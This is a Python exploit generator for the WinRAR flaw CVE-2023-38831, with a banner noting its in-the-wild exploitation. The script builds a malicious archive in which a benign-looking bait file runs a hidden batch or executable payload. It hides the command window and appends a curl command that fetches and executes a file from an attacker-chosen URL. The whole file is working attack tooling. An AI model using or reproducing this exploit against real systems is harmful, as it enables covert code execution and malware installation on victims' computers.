import os, sys
from os.path import join
import shutil
import argparse

global template_folder
global bait_filename
global payload_filename
global output_filename

def clean_up():
    print("[+] Remove Cache Files...")
    if os.path.exists("Modified_"+payload_filename):
        os.remove("Modified_"+payload_filename)
    if os.path.exists(template_folder):
        shutil.rmtree(template_folder)
    if os.path.exists(template_folder + ".zip"):
        os.remove(template_folder + ".zip")
        print("[+] Delete a zip file...")

print("""   ___   __   __   ___             ___      __     ___     ____            ____    ___     ___     ____     _    
  / __|  \ \ / /  | __|    ___    |_  )    /  \   |_  )   |__ /    ___    |__ /   ( _ )   ( _ )   |__ /    / |   
 | (__    \ V /   | _|    |___|    / /    | () |   / /     |_ \   |___|    |_ \   / _ \   / _ \    |_ \    | |   
  \___|    \_/    |___|           /___|   _\__/   /___|   |___/           |___/   \___/   \___/   |___/    |_| BY MD.

RARLabs WinRAR before 6.23 allows attackers to execute arbitrary code when a user attempts to view a benign file within a ZIP archive.
This was exploited in the wild in April through August 2023.
""")

parser = argparse.ArgumentParser()
parser.add_argument("-b","--bait-file",dest="bait_filename",type=str,default="",required=True,help="If you want to use an exe file as a payload, you should select 'bait_for_exe_file.pdf'.")
parser.add_argument("-p","--payload-file",dest="payload_filename",type=str,default="",required=True,help="You can use bat or cmd and exe")
parser.add_argument("-u","--payload-url",dest="payload_url",type=str,default="",required=True,help="https://....")
parser.add_argument("-o","--output-file",dest="output_filename",type=str,default="",required=True)

args = parser.parse_args()

template_folder = "template_folder"
bait_filename = args.bait_filename
payload_filename = args.payload_filename
output_filename = args.output_filename

clean_up()

if(args.payload_filename.split(".")[-1] == "bat" or args.payload_filename.split(".")[-1] == "cmd"):
    filetype = ""
    cmd = """if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
@echo off
=====PAYLOAD=====
exit
"""
else:
    filetype = "b"

# Read content from payload_filename
try:
    print("[+] Read content from "+args.payload_filename)
    f = open(args.payload_filename,"r"+filetype)
    content = f.read()
    f.close()
except:
    print("[X] Not found payload file...")
    sys.exit()

# Create a new commands scripts command_temp.bat
try:
    modified_payload_filename = "Modified_"+args.payload_filename
    if filetype == "":
        print("[+] Create a new commands script ("+modified_payload_filename+")")
        with open(modified_payload_filename, "w") as f:
            cmd = cmd.replace("=====PAYLOAD=====",content+" & curl "+args.payload_url+" -o "+args.bait_filename+" & "+args.bait_filename)
            f.write(cmd)
    else:
        with open(modified_payload_filename, "w"+filetype) as f:
            f.write(content)
except:
    print("[X] Can't create a commands_temp file..")
    sys.exit()

# Extract ext from bait_filename
original_ext = b"."+bytes(args.bait_filename.split(".")[-1], "utf-8")
ext_payload_filename = payload_filename.split(".")[-1]

# Create a new folder
try:
    print("[+] Create a new folder...")
    os.mkdir(template_folder)
    d = join(template_folder,args.bait_filename+"A")
    if not os.path.exists(d):
        os.mkdir(d)
except:
    print("[X] Can't create a folder for template..")
    sys.exit()

# Copy commands_temp and the original file
try:
    print("[+] Copy commands_temp and the original file...")
    shutil.copyfile(join(modified_payload_filename),join(d,args.bait_filename+"A."+ext_payload_filename))
    shutil.copyfile(join(args.bait_filename),join(template_folder, args.bait_filename+"B"))
except Exception as e:
    print(e)
    sys.exit()

try:
    print("[+] Create a zip file...")
    shutil.make_archive(template_folder,'zip',template_folder)
    with open(template_folder+".zip","rb") as f:
        content = f.read()
        content = content.replace(original_ext+b"A",original_ext+b" ")
        content = content.replace(original_ext+b"B",original_ext+b" ")
except Exception as e:
    print(e)
    sys.exit()

# Create a final rar file
try:
    print("[+] Get the content from the temp zip & Create a final rar file...")
    with open(args.output_filename,"wb") as f:
        f.write(content)
except:
    print("[X] Can't create a rar file..")
    sys.exit()

clean_up()